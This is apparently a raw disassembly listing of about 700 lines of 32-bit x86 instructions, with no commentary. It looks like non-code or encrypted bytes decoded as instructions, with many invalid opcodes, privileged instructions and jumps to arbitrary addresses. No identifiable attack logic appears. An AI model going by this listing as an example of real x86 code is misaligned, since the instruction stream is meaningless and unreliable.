  401924:	adc    esi,DWORD PTR [ebx+0x7b]
  401927:	and    BYTE PTR [esi+0x1347e3ae],bh
  40192d:	shl    BYTE PTR [edx+0x6658fe3f],cl
  401933:	xchg   edx,eax
  401934:	jae    0x40197d
  401936:	sub    BYTE PTR [edx-0x72],cl
  401939:	rol    DWORD PTR [eax+0x9],cl
  40193c:	outs   dx,DWORD PTR ds:[esi]
  40193d:	mov    bl,0x7d
  40193f:	fldenv [ebx-0x4f]
  401942:	fdivr  QWORD PTR [ecx-0x3072dc6b]
  401948:	xchg   ebp,eax
  401949:	retf   
  40194a:	push   ebx
  40194b:	xchg   BYTE PTR [ebx-0x2c08378c],cl
  401951:	hlt    
  401952:	push   esp
  401953:	stc    
  401954:	fdivr  QWORD PTR [ebx-0x3d]
  401957:	or     eax,0xad7cfb59
  40195c:	xchg   esi,eax
  40195d:	mov    ss,WORD PTR [esi-0x39d7eb75]
  401963:	jg     0x401927
  401965:	std    
  401966:	inc    edx
  401967:	mov    esp,0x543687eb
  40196c:	and    DWORD PTR [esi+0x38],0x2c
  401970:	enter  0xb047,0x23
  401974:	xor    cl,bl
  401976:	cmp    DWORD PTR [eax+0x664d85f3],esi
  40197c:	ret    
  40197d:	mov    edx,0x78237a72
  401982:	cwde   
  401983:	out    dx,eax
  401984:	cdq    
  401985:	das    
  401986:	es inc edx
  401988:	xor    DWORD PTR [ebx-0x78ae37cd],ebp
  40198e:	adc    ch,BYTE PTR [ecx-0x346ff534]
  401994:	dec    edi
  401995:	iret   
  401996:	mov    ebp,DWORD PTR [eax+ebp*4-0x41]
  40199a:	xlat   BYTE PTR ds:[ebx]
  40199b:	out    0xea,eax
  40199d:	add    eax,0xc26a00ca
  4019a2:	aas    
  4019a3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4019a4:	sub    eax,0xc387be3
  4019a9:	sub    al,0x1b
  4019ab:	adc    eax,0xa6082b84
  4019b0:	lds    esp,FWORD PTR [ecx+eax*2-0x75]
  4019b4:	add    BYTE PTR [esi-0x66c7da72],ch
  4019ba:	xchg   edi,eax
  4019bb:	(bad)
  4019bf:	icebp  
  4019c0:	and    eax,0x74aa5849
  4019c5:	inc    ecx
  4019c6:	fxch   st(1)
  4019c8:	outs   dx,BYTE PTR ds:[esi]
  4019c9:	push   eax
  4019ca:	sar    bl,1
  4019cc:	hlt    
  4019cd:	scas   al,BYTE PTR es:[edi]
  4019ce:	or     BYTE PTR ds:0x2bfb1865,cl
  4019d4:	jle    0x401a3b
  4019d6:	sbb    ch,BYTE PTR [edi-0x74bbaca2]
  4019dc:	stc    
  4019dd:	cmp    eax,0x6bf78f26
  4019e2:	pusha  
  4019e3:	ret    0x9c06
  4019e6:	and    edi,edx
  4019e8:	mov    edx,gs
  4019ea:	lods   eax,DWORD PTR ds:[esi]
  4019eb:	or     eax,0x4271e110
  4019f0:	sub    ecx,DWORD PTR [edi-0x2780bdda]
  4019f6:	xchg   ebx,eax
  4019f7:	cmp    eax,0x748346dc
  4019fc:	aas    
  4019fd:	fmul   DWORD PTR [ebp-0x73]
  401a00:	call   0x434a0973
  401a05:	outs   dx,DWORD PTR ds:[esi]
  401a06:	mov    esi,0x84d1c238
  401a0b:	sub    ecx,DWORD PTR [ebp+0x120ad79c]
  401a11:	adc    bl,dh
  401a13:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a14:	fld    DWORD PTR [edi]
  401a16:	and    edx,ebx
  401a18:	into   
  401a19:	das    
  401a1a:	xor    bh,BYTE PTR [edi+0x42]
  401a1d:	(bad)  
  401a1e:	stos   DWORD PTR es:[edi],eax
  401a1f:	sub    ecx,edx
  401a21:	pop    edi
  401a22:	cmp    esi,DWORD PTR [ebx+0x3bd3ac24]
  401a28:	cmc    
  401a29:	fistp  DWORD PTR [eax]
  401a2b:	push   edx
  401a2c:	inc    esi
  401a2d:	push   0x5e
  401a2f:	mov    ds:0xe96d8ed1,eax
  401a34:	push   0x46948576
  401a39:	lea    eax,[eax]
  401a3b:	cmc    
  401a3c:	mov    edx,0x78903472
  401a41:	xchg   DWORD PTR [edx],esi
  401a43:	shr    DWORD PTR [ebx+ebp*2+0x7a],cl
  401a47:	test   BYTE PTR [edi+0x3e],cl
  401a4a:	xchg   esp,eax
  401a4b:	lods   eax,DWORD PTR ds:[esi]
  401a4c:	mov    esi,0x4a5ddd8
  401a51:	sub    bl,BYTE PTR [edi-0x5b223984]
  401a57:	aam    0x7f
  401a59:	pop    eax
  401a5a:	mov    edi,0xd3894e
  401a5f:	rol    BYTE PTR [edi+0x3b],0x4a
  401a63:	push   0x5af12b79
  401a68:	call   0x773d:0x3b38c157
  401a6f:	xchg   esp,eax
  401a70:	xchg   edi,eax
  401a71:	and    ah,BYTE PTR [edi-0x6e304876]
  401a77:	and    ch,dl
  401a79:	push   esi
  401a7a:	sbb    esp,DWORD PTR [edx-0x43]
  401a7d:	data16 aaa 
  401a7f:	or     BYTE PTR [esi-0x1133b527],bh
  401a85:	fistp  QWORD PTR [ecx]
  401a87:	shl    BYTE PTR [edi+0x5e50951f],0x5
  401a8e:	test   BYTE PTR [ecx+0x1b93866c],cl
  401a94:	xor    eax,0xcac93aa3
  401a99:	lods   eax,DWORD PTR ds:[esi]
  401a9a:	stos   BYTE PTR es:[edi],al
  401a9b:	out    dx,eax
  401a9c:	jecxz  0x401b02
  401a9e:	mov    al,0x64
  401aa0:	div    DWORD PTR [edi+0x14618f74]
  401aa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401aa7:	clc    
  401aa8:	sub    BYTE PTR [ebp-0x5d702547],ah
  401aae:	in     al,dx
  401aaf:	loopne 0x401a75
  401ab1:	mul    DWORD PTR [esi+0x1b]
  401ab4:	shl    DWORD PTR [ebx+ebp*4],cl
  401ab7:	ror    eax,cl
  401ab9:	outs   dx,DWORD PTR ds:[esi]
  401aba:	(bad)  [edi-0x5552663e]
  401ac0:	test   eax,0x967dfd2e
  401ac5:	popa   
  401ac6:	pop    edx
  401ac7:	jns    0x401b28
  401ac9:	cmp    al,0x50
  401acb:	hlt    
  401acc:	mov    eax,0xf681e687
  401ad1:	xchg   edi,eax
  401ad2:	jne    0x401abf
  401ad4:	test   eax,0xeab26618
  401ad9:	sahf   
  401ada:	xor    eax,0x22e160ac
  401adf:	mov    WORD PTR [ecx+0x4a5a6277],es
  401ae5:	enter  0x1712,0x32
  401ae9:	push   ds
  401aea:	sbb    al,0x97
  401aed:	hlt    
  401aee:	mov    edx,0x2423796
  401af3:	xchg   edx,eax
  401af4:	adc    BYTE PTR [eax],ah
  401af6:	jecxz  0x401a81
  401af8:	mov    ah,bh
  401afa:	or     dh,BYTE PTR [ecx]
  401afc:	(bad)  
  401afd:	mov    esp,0xa51821c9
  401b02:	cld    
  401b03:	hlt    
  401b04:	xchg   ebp,eax
  401b05:	push   es
  401b06:	stos   DWORD PTR es:[edi],eax
  401b07:	adc    eax,0xf9d563d3
  401b0c:	(bad)
  401b10:	fadd   QWORD PTR [ecx+esi*1-0x6eb90113]
  401b17:	sbb    DWORD PTR [ecx+0x2c56444f],esi
  401b1d:	fldcw  WORD PTR [esi+0x720dea94]
  401b23:	mov    ds:0xd2c2bc57,eax
  401b28:	ds ret 
  401b2a:	xor    edi,DWORD PTR [edi-0x2af1ad85]
  401b30:	mov    ecx,0xa214b751
  401b35:	out    0xc0,al
  401b37:	inc    esi
  401b38:	mov    cl,0x92
  401b3a:	loopne 0x401af0
  401b3c:	jmp    0xcca8:0x3b824254
  401b43:	int3   
  401b44:	mov    edx,0xf2ac0f00
  401b49:	(bad)  
  401b4a:	inc    ecx
  401b4b:	xchg   BYTE PTR [edx+ebx*1],ch
  401b4e:	ret    0x94a9
  401b51:	je     0x401b1d
  401b53:	icebp  
  401b54:	dec    ebp
  401b55:	sub    eax,0xe127af8
  401b5a:	xor    eax,0xca926b4e
  401b5f:	mov    ebp,0x58040c20
  401b64:	sar    DWORD PTR [ecx-0x70],cl
  401b67:	or     dl,BYTE PTR [ebp+0x2548a09]
  401b6d:	pusha  
  401b6e:	sub    DWORD PTR [ecx],edx
  401b70:	fxtract 
  401b72:	push   esi
  401b73:	dec    ebx
  401b74:	fisttp QWORD PTR [edi-0x51f253e5]
  401b7a:	stos   DWORD PTR es:[edi],eax
  401b7b:	mov    esp,0xf25194fd
  401b80:	xchg   ecx,eax
  401b81:	push   esp
  401b82:	ret    
  401b83:	pop    eax
  401b84:	outs   dx,DWORD PTR ds:[esi]
  401b85:	rcl    bl,cl
  401b87:	in     al,0x46
  401b89:	xchg   ebp,eax
  401b8a:	dec    esi
  401b8b:	(bad)  
  401b8c:	fst    QWORD PTR [eax]
  401b8e:	retf   
  401b8f:	dec    ebx
  401b90:	and    edx,DWORD PTR [ecx+0xc]
  401b93:	mov    dh,0x2e
  401b95:	addr16 ret 
  401b97:	in     eax,0x20
  401b99:	fmul   QWORD PTR [edx+esi*1+0x6e]
  401b9d:	mov    edi,DWORD PTR [esi]
  401b9f:	adc    al,0xf2
  401ba1:	push   esp
  401ba2:	rcl    dh,0xa9
  401ba5:	aaa    
  401ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ba7:	leave  
  401ba8:	mov    al,0xe4
  401baa:	mov    esi,0x430a110d
  401baf:	fmul   st,st(6)
  401bb1:	jp     0x401ba3
  401bb3:	and    ch,BYTE PTR [ecx]
  401bb5:	imul   ecx,ebx,0x4710bb66
  401bbb:	or     eax,0xe354a9ca
  401bc0:	ss (bad) 
  401bc3:	add    DWORD PTR [esi+0x50],esi
  401bc6:	sub    eax,0xef778d0a
  401bcb:	add    eax,0x44a7a90b
  401bd0:	fwait
  401bd1:	aas    
  401bd2:	add    DWORD PTR [eax+0x38],eax
  401bd5:	or     BYTE PTR [ecx],dh
  401bd7:	leave  
  401bd8:	lahf   
  401bd9:	(bad)  
  401bda:	loop   0x401c06
  401bdc:	inc    ecx
  401bdd:	ins    BYTE PTR es:[edi],dx
  401bde:	out    dx,al
  401bdf:	les    esp,FWORD PTR [ebx+0x20]
  401be2:	push   0x7ce2213b
  401be7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401be8:	stos   DWORD PTR es:[edi],eax
  401be9:	retf   0x5e11
  401bec:	inc    edi
  401bed:	popa   
  401bee:	fldenv [ecx+0x617af9f]
  401bf4:	mov    ch,0xb
  401bf6:	sbb    BYTE PTR [esi-0x43305a57],ch
  401bfc:	mov    ecx,0x91f8ffc6
  401c01:	push   esp
  401c02:	dec    ebx
  401c03:	dec    ebx
  401c04:	(bad)  
  401c05:	mov    dl,0xb2
  401c07:	cld    
  401c08:	cmc    
  401c09:	mov    ds:0x65ae607e,eax
  401c0e:	(bad)  
  401c0f:	fdivr  QWORD PTR [esi-0x6bf74130]
  401c15:	add    cl,bl
  401c17:	dec    eax
  401c18:	mov    al,ds:0xba7c5b1f
  401c1d:	jl     0x401bad
  401c1f:	mov    esp,0x99270b4f
  401c24:	in     al,dx
  401c25:	cmc    
  401c26:	data16 stc 
  401c28:	inc    esp
  401c29:	sysenter 
  401c2b:	call   0x1fe5:0x9822f781
  401c32:	and    dh,ah
  401c34:	dec    esi
  401c35:	jns    0x401bdf
  401c37:	mov    edi,0x10fc378f
  401c3c:	fisttp QWORD PTR [esi]
  401c3e:	jl     0x401c55
  401c40:	test   al,0xb8
  401c42:	in     eax,0xae
  401c44:	ret    0xf901
  401c47:	mov    eax,DWORD PTR [eax-0x16ef7d0e]
  401c4d:	ret    0xa028
  401c50:	xchg   BYTE PTR [ebx+0x263499ef],dl
  401c56:	mov    ah,0xf6
  401c58:	icebp  
  401c59:	mov    ds:0x92969d27,al
  401c5e:	sbb    ch,BYTE PTR ds:0x439d5435
  401c64:	arpl   cx,ax
  401c66:	add    DWORD PTR [eax+0x18aea59b],edi
  401c6c:	adc    ch,BYTE PTR [esi]
  401c6e:	push   ebp
  401c6f:	stc    
  401c70:	inc    edi
  401c71:	pop    edi
  401c72:	imul   DWORD PTR [edi]
  401c74:	add    eax,0xaf868e33
  401c79:	pusha  
  401c7a:	mov    ecx,tr4
  401c7d:	cld    
  401c7e:	push   0x2672630a
  401c83:	sar    ch,1
  401c85:	push   ebp
  401c86:	js     0x401c3e
  401c88:	stc    
  401c89:	fcom   QWORD PTR [ebx-0x340589dd]
  401c8f:	mov    eax,0x5b7985fa
  401c94:	pop    ebx
  401c95:	inc    esp
  401c96:	pop    es
  401c97:	sbb    eax,0x29b90845
  401c9c:	stos   DWORD PTR es:[edi],eax
  401c9d:	xchg   ebp,eax
  401c9e:	call   0xd566:0xed9854a6
  401ca5:	inc    esp
  401ca6:	dec    ecx
  401ca7:	inc    esp
  401ca8:	or     bh,BYTE PTR [ebx-0x6c]
  401cab:	mov    DWORD PTR [ecx],0xd9c7c5d7
  401cb1:	inc    ecx
  401cb2:	popf   
  401cb3:	lock and BYTE PTR [esi+0x60492207],0x96
  401cbb:	xchg   ebx,eax
  401cbc:	mov    al,0xb0
  401cbe:	xor    DWORD PTR ds:0x83eea71a,esp
  401cc4:	xor    eax,0xb74016cd
  401cc9:	jge    0x401c6a
  401ccb:	inc    esi
  401ccc:	xlat   BYTE PTR ds:[ebx]
  401ccd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cce:	(bad)  
  401ccf:	and    eax,DWORD PTR [ebp-0x38]
  401cd2:	hlt    
  401cd3:	jbe    0x401cc1
  401cd5:	push   edi
  401cd6:	xchg   edi,eax
  401cd7:	sbb    cl,BYTE PTR [eax]
  401cd9:	sbb    dl,BYTE PTR [ecx-0x5a63306]
  401cdf:	pop    ss
  401ce0:	(bad)  
  401ce1:	pop    edx
  401ce2:	repnz sub esi,ecx
  401ce5:	out    0x14,eax
  401ce7:	dec    esp
  401ce8:	in     eax,0xed
  401cea:	adc    dh,bl
  401cec:	adc    cl,ch
  401cee:	call   0x19848fc
  401cf3:	fucompp 
  401cf5:	out    0x79,al
  401cf7:	cs scas al,BYTE PTR es:[edi]
  401cf9:	xchg   ebx,eax
  401cfa:	in     al,0x64
  401cfc:	xchg   ebp,eax
  401cfd:	push   eax
  401cfe:	xor    edx,0xffffff82
  401d01:	jnp    0x401cbc
  401d03:	add    ebx,DWORD PTR [ebp+0x347fdc22]
  401d09:	pop    ebp
  401d0a:	dec    edi
  401d0b:	fistp  DWORD PTR [edi+0x68]
  401d0e:	jmp    0x401cc6
  401d10:	les    esp,FWORD PTR [ebx-0x6837469e]
  401d16:	out    dx,al
  401d17:	shl    DWORD PTR [eax-0x17f503f3],1
  401d1d:	rol    BYTE PTR [edx+0x9bb4ed1],1
  401d23:	xor    esp,DWORD PTR [ecx]
  401d25:	loop   0x401d44
  401d27:	inc    ecx
  401d28:	xchg   esp,eax
  401d29:	pop    ss
  401d2a:	mov    bh,BYTE PTR [edx-0x78c3e7fb]
  401d30:	scas   eax,DWORD PTR es:[edi]
  401d31:	fisub  WORD PTR ds:0xada36b9f
  401d37:	cmp    bh,ch
  401d39:	mov    ds:0xa3a1a280,al
  401d3e:	cmp    DWORD PTR [ecx],eax
  401d40:	push   edi
  401d41:	out    0xc4,eax
  401d43:	mov    ch,0x1e
  401d45:	xor    BYTE PTR [ecx-0x1b69214],0x3b
  401d4c:	ins    DWORD PTR es:[edi],dx
  401d4d:	sub    DWORD PTR [esi],esi
  401d4f:	cmp    al,0xa5
  401d51:	and    eax,0xab8fa64b
  401d56:	in     al,0x69
  401d58:	out    0x28,al
  401d5a:	pop    edi
  401d5b:	and    eax,0xd57085cc
  401d60:	jg     0x401d88
  401d62:	daa    
  401d63:	pushf  
  401d64:	dec    edx
  401d65:	xchg   ecx,eax
  401d66:	mov    edi,ecx
  401d68:	lea    esi,[esi-0x9290569]
  401d6e:	icebp  
  401d6f:	dec    ebp
  401d70:	mov    ebp,0x1802862a
  401d75:	into   
  401d76:	dec    esi
  401d77:	std    
  401d78:	not    BYTE PTR [ebx]
  401d7a:	enter  0x5913,0x3d
  401d7e:	xchg   esp,eax
  401d7f:	popf   
  401d80:	jbe    0x401da0
  401d82:	sub    ah,BYTE PTR [esi-0x78114a01]
  401d88:	xchg   BYTE PTR [eax-0x63],bh
  401d8b:	mov    eax,0xd6b36460
  401d90:	push   edi
  401d91:	lds    esp,FWORD PTR [eax+0x36]
  401d94:	mov    edi,0x770ddb37
  401d99:	or     eax,0xe18c672f
  401d9e:	sbb    cl,BYTE PTR [ecx-0x3]
  401da1:	inc    edi
  401da2:	jg     0x401d45
  401da4:	mov    ch,0x20
  401da6:	pop    ebp
  401da7:	es ins BYTE PTR es:[edi],dx
  401da9:	das    
  401daa:	test   eax,0x17d55dae
  401daf:	pop    es
  401db0:	shl    DWORD PTR [esi],cl
  401db2:	add    al,0x27
  401db4:	pop    ebp
  401db5:	jno    0xc7e8cadb
  401dbb:	xor    ch,BYTE PTR [ebx]
  401dbd:	pop    ebx
  401dbe:	lods   al,BYTE PTR ds:[esi]
  401dbf:	lock jge 0x401d42
  401dc2:	and    dh,BYTE PTR [esp+esi*2-0x3713d5f3]
  401dc9:	dec    esp
  401dca:	inc    ebx
  401dcb:	cld    
  401dcc:	scas   eax,DWORD PTR es:[edi]
  401dcd:	mov    ah,BYTE PTR [ecx]
  401dcf:	jno    0x401d6e
  401dd1:	fisttp QWORD PTR ds:0xfe4f3aa3
  401dd7:	pop    esp
  401dd8:	mov    al,0xaa
  401dda:	cmc    
  401ddb:	jmp    0x401d5d
  401ddd:	popa   
  401dde:	enter  0xcbf3,0x1a
  401de2:	pop    edx
  401de3:	loope  0x401dfb
  401de5:	dec    ecx
  401de6:	inc    ecx
  401de7:	call   0x94868538
  401dec:	retf   0xeab1
  401def:	mov    al,ds:0x6da031a8
  401df4:	test   ecx,esi
  401df6:	mov    ecx,0x6d306dce
  401dfb:	mov    ecx,ecx
  401dfd:	add    al,0x8a
  401dff:	mov    BYTE PTR [edx+0x59],ch
  401e02:	ffree  st(4)
  401e04:	cs inc edi
  401e06:	push   edx
  401e07:	or     DWORD PTR [eax+0x2c],edx
  401e0a:	pushf  
  401e0b:	stos   BYTE PTR es:[edi],al
  401e0c:	loope  0x401ddd
  401e0e:	add    al,0xe7
  401e10:	in     al,dx
  401e11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e12:	sbb    al,0xe1
  401e14:	jae    0x401e7b
  401e16:	scas   eax,DWORD PTR es:[edi]
  401e17:	push   0x6b
  401e19:	jecxz  0x401e41
  401e1b:	stc    
  401e1c:	jo     0x401dfc
  401e1e:	dec    ecx
  401e1f:	stos   DWORD PTR es:[edi],eax
  401e20:	jae    0x401de6
  401e22:	stos   BYTE PTR es:[edi],al
  401e23:	aam    0x5
  401e25:	inc    esp
  401e26:	jae    0x401e04
  401e28:	lds    edi,FWORD PTR [ebx+0x79fe3dbc]
  401e2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401e2f:	int3   
  401e30:	jecxz  0x401dea
  401e32:	dec    edx
  401e33:	xchg   esp,eax
  401e34:	in     eax,dx
  401e35:	inc    ebx
  401e36:	mov    al,al
  401e38:	fild   QWORD PTR ss:[ebp-0x76]
  401e3c:	mov    DWORD PTR [ecx+0x3fd46c14],eax
  401e42:	push   ecx
  401e43:	ins    DWORD PTR es:[edi],dx
  401e44:	repz cli 
  401e46:	int    0x78
  401e48:	jae    0x401e49
  401e4a:	or     BYTE PTR [edx-0x2b1ee31f],cl
  401e50:	(bad)  
  401e51:	jae    0x401e1d
  401e53:	mov    ds:0x7ac7f8b0,eax
  401e58:	mov    cs,ebx
  401e5a:	cld    
  401e5b:	xor    DWORD PTR [esi+0x454de0b9],edx
  401e61:	mov    edi,0x42a2bea2
  401e66:	out    dx,al
  401e67:	and    BYTE PTR [ebp-0x52],0x7c
  401e6b:	popa   
  401e6c:	repnz xor edx,DWORD PTR [ebx+esi*1-0x78]
  401e71:	or     BYTE PTR [ebx+0x26],dl
  401e74:	or     bh,BYTE PTR [ebp-0x221d7649]
  401e7a:	int3   
  401e7b:	xchg   ebp,eax
  401e7c:	inc    edi
  401e7d:	das    
  401e7e:	loop   0x401eeb
  401e80:	aas    
  401e81:	push   eax
  401e82:	out    0x5b,al
  401e84:	cmp    bh,BYTE PTR [ebx-0xc]
  401e87:	jnp    0x401e5d
  401e89:	add    edi,DWORD PTR [edx]
  401e8b:	jne    0x401ebd
  401e8d:	sub    esi,esi
  401e8f:	and    DWORD PTR [ecx],eax
  401e91:	mov    BYTE PTR [ebx+edi*2-0x80],bl
  401e95:	scas   eax,DWORD PTR es:[edi]
  401e96:	stc    
  401e97:	and    BYTE PTR [ebp-0x42dc5511],cl
  401e9d:	cmp    al,0x48
  401e9f:	sub    bl,BYTE PTR [ecx+0x465f40ae]
  401ea5:	bound  eax,QWORD PTR [esi-0x4a]
  401ea8:	mov    ds:0xff72d8c8,al
  401ead:	adc    ah,0x75
  401eb0:	(bad)  
  401eb1:	in     eax,0x1f
  401eb3:	aaa    
  401eb4:	xor    cl,bl
  401eb6:	enter  0xc523,0xa3
  401eba:	xlat   BYTE PTR ds:[ebx]
  401ebb:	mov    DWORD PTR [eax-0x4d5adba],ebp
  401ec1:	es xor ch,0xbb
  401ec5:	into   
  401ec6:	call   0x7fb4959a
  401ecb:	lock dec ebp
  401ecd:	dec    edi
  401ece:	js     0x401e91
  401ed0:	enter  0x8eea,0xeb
  401ed4:	mov    bl,0x50
  401ed6:	mov    BYTE PTR [eax-0x4e],ah
  401ed9:	lds    eax,FWORD PTR [ebp+0x61]
  401edc:	xchg   ebx,eax
  401edd:	pushf  
  401ede:	(bad)  [ebx]
  401ee0:	(bad)  
  401ee1:	push   0x9fb67a16
  401ee6:	inc    esi
  401ee7:	sbb    DWORD PTR [esi-0x5c],0xffffff93
  401eeb:	inc    esp
  401eec:	adc    eax,0xf82f4627
  401ef1:	xchg   edx,eax
  401ef2:	adc    al,0x22
  401ef4:	add    DWORD PTR [eax-0x51],eax
  401ef7:	sbb    edi,DWORD PTR [ebp+esi*2-0x23ae1854]
  401efe:	aas    
  401eff:	test   BYTE PTR [ebx],bl
  401f01:	pop    esi
  401f02:	or     DWORD PTR [eax+ebp*1+0x6192b022],ecx
  401f09:	pop    ds
  401f0a:	pusha  
  401f0b:	pop    es
  401f0c:	and    DWORD PTR [ebx-0x68],ebp
  401f0f:	shl    esi,1
  401f11:	mov    edi,ecx
  401f13:	jg     0x401eac
  401f15:	dec    esp
  401f16:	into   
  401f17:	addr16 sub al,0x36
  401f1a:	in     eax,dx
  401f1b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401f1c:	xchg   esi,eax
  401f1d:	push   es
  401f1e:	call   FWORD PTR [edi+0x53b96c97]
  401f24:	add    eax,0x79cca929
  401f29:	aaa    
  401f2a:	mov    bh,0x69
  401f2c:	test   al,0x43
  401f2e:	add    bl,BYTE PTR [edi-0x4e]
  401f31:	xor    ebx,DWORD PTR [esi-0x4d]
  401f34:	imul   ecx,eax,0x1f
  401f37:	test   al,0x24
  401f39:	jle    0x401f6d
  401f3b:	inc    esp
  401f3c:	and    al,0x2e
  401f3e:	dec    ecx
  401f3f:	out    0x9c,eax
  401f41:	sbb    BYTE PTR [esi-0x59],dl
  401f44:	aaa    
  401f45:	es loopne 0x401ed7
  401f48:	push   esi
  401f49:	push   edi
  401f4a:	jb     0x401f5f
  401f4c:	sbb    eax,0x6806b459
  401f51:	push   ebp
  401f52:	jnp    0x401ef1
  401f54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f55:	mov    WORD PTR [edi-0x18],es
  401f58:	mov    BYTE PTR [eax-0x72],cl
  401f5b:	icebp  
  401f5c:	push   esi
  401f5d:	fs xchg esp,eax
  401f5f:	fsub   st(2),st
  401f61:	mov    bl,0xcc
  401f63:	stc    
  401f64:	xchg   edx,eax
  401f65:	jg     0x401fa9
  401f67:	xchg   ebp,eax
  401f68:	dec    edi
  401f69:	iret   
  401f6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f6b:	mov    dh,0x3d
  401f6d:	sub    al,dh
  401f6f:	ins    BYTE PTR es:[edi],dx
  401f70:	add    ah,BYTE PTR [ebx+0x7da0ff2d]
  401f76:	add    ch,dh
  401f78:	jle    0x401fda
  401f7a:	add    eax,ebx
  401f7c:	mov    bh,0xe5
  401f7e:	shl    BYTE PTR [esi+0x1b],cl
  401f81:	push   es
  401f82:	pop    ss
  401f83:	adc    edx,DWORD PTR ds:0xcc5abb8d
  401f89:	sub    ch,BYTE PTR [ecx]
  401f8b:	popa   
  401f8c:	xor    esi,edi
  401f8e:	mov    edx,0x337194cc
  401f93:	mov    edx,0x248bde1a
  401f98:	outs   dx,BYTE PTR ds:[esi]
  401f99:	cmp    BYTE PTR [esi+0x7],ch
  401f9c:	lods   al,BYTE PTR gs:[esi]
  401f9e:	or     bh,bl
  401fa0:	sbb    bl,cl
  401fa2:	add    al,0x69
  401fa4:	ror    ebp,0xbc
  401fa7:	(bad)  
  401fa8:	int    0x5e
  401faa:	div    BYTE PTR [ebp-0x7a]
  401fad:	cmp    eax,0x3f531c78
  401fb2:	div    DWORD PTR [ebx+0x52dddc14]
  401fb8:	ss (bad) 
  401fba:	mov    ebx,0x8c866ea7
  401fbf:	cld    
  401fc0:	mov    esi,0x79b98d4f
  401fc5:	push   ebp
  401fc6:	aas    
  401fc7:	sar    BYTE PTR [ebx+esi*1+0x64],cl
  401fcb:	shl    BYTE PTR [ebp-0x4adcee6a],cl
  401fd1:	xchg   ebx,eax
  401fd2:	pmuludq mm6,QWORD PTR [edx+0x2776bd80]
  401fd9:	dec    ecx
  401fda:	in     al,0x19
  401fdc:	cdq    
  401fdd:	mov    dh,0xab
  401fdf:	scas   al,BYTE PTR es:[edi]
  401fe0:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fe2:	sbb    DWORD PTR [eax+0x789af9ae],ebp
  401fe8:	fwait
  401fe9:	push   ebx
  401fea:	mov    ebx,0x56307db5
  401fef:	sbb    edx,DWORD PTR [ecx]
  401ff1:	pop    ebx
  401ff2:	aad    0x49
  401ff4:	in     eax,dx
  401ff5:	stos   DWORD PTR es:[edi],eax
  401ff6:	inc    esi
  401ff7:	jmp    0x9b06:0x381771ed
  401ffe:	add    eax,edx
  402000:	loopne 0x402011
  402002:	dec    edx
  402003:	sub    al,0x5c
  402005:	sti    
  402006:	(bad)  
  402007:	push   esi
  402008:	add    BYTE PTR [ecx+0xcf0cdb9],dh
  40200e:	jmp    0xac049699
  402013:	(bad)  
  402014:	repnz imul BYTE PTR [esi-0x59fe9c19]
  40201b:	jecxz  0x401fc9
  40201d:	scas   al,BYTE PTR es:[edi]
  40201e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40201f:	cs dec esi
  402021:	ins    DWORD PTR es:[edi],dx
  402022:	jl     0x401fc7
  402024:	ret    0x69c6
  402027:	fadd   QWORD PTR [edx]
  402029:	push   ebx
  40202a:	leave  
  40202b:	iret   
  40202c:	inc    eax
  40202d:	test   eax,0xb28bcf8c
  402032:	bswap  eax
  402034:	push   edx
  402035:	jno    0x402037
  402037:	stos   DWORD PTR es:[edi],eax
  402038:	pop    ss
  402039:	cwde   
  40203a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40203b:	mov    ebx,0xd51cd10b
  402040:	lahf   
  402041:	xchg   ebx,eax
  402042:	push   ds
  402043:	js     0x401fd9
  402045:	pop    ebp
  402046:	inc    edx
  402047:	push   eax
  402048:	(bad)  
  402049:	imul   esp,DWORD PTR [esp+esi*1-0xd],0x5ef04507
  402051:	mov    WORD PTR [edi-0x52ea3424],?
  402057:	and    eax,0x314065ef
  40205c:	mov    ds:0xa47b553,eax
  402061:	cmp    al,0xdf
  402063:	ds aaa 
  402065:	inc    esp
  402066:	push   ebx
  402067:	hlt    
  402068:	or     ebp,DWORD PTR ds:0xd7398411
  40206e:	addr16 out dx,eax
  402070:	inc    ebx
  402071:	sub    al,0x74
  402073:	sub    BYTE PTR cs:[eax+0x1b],ah
  402077:	push   ss
  402078:	data16 das 
  40207a:	mov    DWORD PTR [ebp-0x38],edi
  40207d:	inc    eax
  40207e:	fwait
  40207f:	dec    ebx
  402080:	test   BYTE PTR [ebx-0x36],dh
  402083:	iret   
  402084:	dec    eax
  402085:	xor    ah,BYTE PTR [eax+0x79]
  402088:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402089:	cli    
  40208a:	gs out 0xb4,eax
  40208d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40208e:	or     bh,BYTE PTR [eax-0x67]
  402091:	loope  0x402077
  402093:	mov    ebp,0xe8dc1981
  402098:	pop    edi
  402099:	push   edx
  40209a:	push   0x52bf1e47
  40209f:	and    BYTE PTR [ebx-0x30],al
  4020a2:	inc    edi
  4020a3:	(bad)  
  4020a4:	(bad)  
  4020a5:	xor    ah,BYTE PTR [esi+0x3f]
  4020a8:	mov    edx,ss
  4020aa:	and    eax,0x85221d58
  4020af:	imul   ebx
  4020b1:	loope  0x402055
  4020b3:	pop    es
  4020b4:	(bad)  
  4020b5:	data16 mov al,ds:0x6be39a38
  4020bb:	lahf   
  4020bc:	cs sub esp,esi
  4020bf:	and    ch,BYTE PTR [esi-0x7beba532]
  4020c5:	arpl   WORD PTR [ecx+0x7d],si
  4020c8:	mov    ch,BYTE PTR [esi]
  4020ca:	jle    0x402080
  4020cc:	push   cs
  4020cd:	rcl    BYTE PTR [eax+0x77],0x54
  4020d1:	xchg   esi,eax
  4020d2:	mov    edx,0x71ecdc2e
  4020d7:	jno    0x4020d9
  4020d9:	mov    eax,0x3130f486
  4020de:	jbe    0x4020d2
